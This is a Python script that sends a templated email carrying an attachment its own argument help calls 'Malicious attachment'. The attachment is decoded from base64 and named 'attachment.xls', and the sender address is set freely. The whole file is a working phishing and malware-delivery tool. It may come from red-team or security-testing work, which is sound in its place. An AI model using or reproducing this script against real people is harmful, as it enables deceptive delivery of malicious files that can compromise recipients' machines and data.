import smtplib, argparse

from email import encoders, policy
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.parser import BytesParser

from base64 import b64decode

parser = argparse.ArgumentParser()
parser.add_argument("--template", help="Template filename (EML format)")
parser.add_argument("--attachment", help="Malicious attachment (b64 encoded)")
parser.add_argument("--sender", help="Sender email address")
parser.add_argument("--receiver", help="Receiver email address")
parser.add_argument("--server", help="SMTP server (hostname:port)")

args = parser.parse_args()

with open(args.template, "rb") as fp:
    template = BytesParser(policy=policy.default).parse(fp)

plain_body = template.get_body(preferencelist=("plain")).get_content()
html_body = template.get_body(preferencelist=("html")).get_content()

# Create a multipart message and set headers
message = MIMEMultipart()
message["From"] = args.sender
message["To"] = args.receiver
message["Subject"] = template["subject"]

# Add plain body to email
message.attach(MIMEText(plain_body, "plain"))

# Add HTML body to email
message.attach(MIMEText(html_body, "html"))

# Convert attachment from base64 (UTF-16LE encoded)
attachment = b64decode(args.attachment)

# Add file as application/octet-stream
# Email client can usually download this automatically as attachment
part = MIMEBase("application", "octet-stream")
part.set_payload(attachment)

# Encode file in ASCII characters to send by email
encoders.encode_base64(part)

# Add header as key/value pair to attachment part
part.add_header(
    "Content-Disposition",
    f"attachment; filename='attachment.xls'",
)

# Add attachment to message and convert message to string
message.attach(part)
text = message.as_string()

# Log in to server using secure context and send email
with smtplib.SMTP(args.server.split(":")[0], int(args.server.split(":")[1])) as server:
    server.sendmail(args.sender, args.receiver, text)
    print("Email sent!")
